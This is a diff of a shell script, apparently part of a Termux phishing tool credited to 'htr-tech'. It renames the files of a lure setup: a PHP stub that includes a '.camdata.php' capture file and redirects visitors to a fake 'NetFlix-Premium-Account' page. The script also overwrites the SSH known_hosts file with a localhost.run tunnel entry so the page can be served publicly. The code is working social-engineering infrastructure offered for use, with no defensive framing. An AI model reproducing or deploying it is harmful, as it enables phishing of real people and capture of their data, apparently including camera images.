@@ -41,10 +41,10 @@ else
 printf "ssh.localhost.run,35.193.161.204 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3lJnhW1oCXuAYV9IBdcJA+Vx7AHL5S/ZQvV2fhceOAPgO2kNQZla6xvUwoE4iw8lYu3zoE1KtieCU9yInWOVI6W/wFaT/ETH1tn55T2FVsK/zaxPiHZVJGLPPdEEid0vS2p1JDfc9onZ0pNSHLl1QusIOeMUyZ2bUMMLLgw46KOT9S3s/LmxgoJ3PocVUn5rVXz/Dng7Y8jYNe4IFrZOAUsi7hNBa+OYja6ceefpDvNDEJ1BdhbYfGolBdNA7f+FNl0kfaWru4Cblr843wBe2ckO/sNqgeAMXO/qH+SSgQxUXF2AgAw+TGp3yCIyYoOPvOgvcPsQziJLmDbUuQpnH\n" > ~/.ssh/known_hosts
 fi
 
-if [[ -e .www/index.php ]]; then
+if [[ -e .www/main.php ]]; then
 echo ""
 else
-printf "<?php\ninclude '.camdata.php';\nheader('Location: forwarding_link/NetFlix-Premium-Account.html');\nexit\n?>\n" > .www/index.php
+printf "<?php\ninclude '.camdata.php';\nheader('Location: forwarding_link/NetFlix-Premium-Account.html');\nexit\n?>\n" > .www/main.php
 fi
 
 if [[ -e .www/.camdata.php ]]; then
@@ -71,10 +71,10 @@ php .www/.log2.php > .www/.htrtech.php
 rm -rf .www/.log2.php
 fi
 
-if [[ -e .www/NetFlix-Premium-Account.html ]]; then
+if [[ -e .www/main.html ]]; then
 echo ""
 else
-mv .log3.log .www/NetFlix-Premium-Account.html
+mv .log3.log .www/main.html
 fi
 
 echo 'termux-open-url https://github.com/htr-tech/' > /data/data/com.termux/files/usr/bin/htr-tech
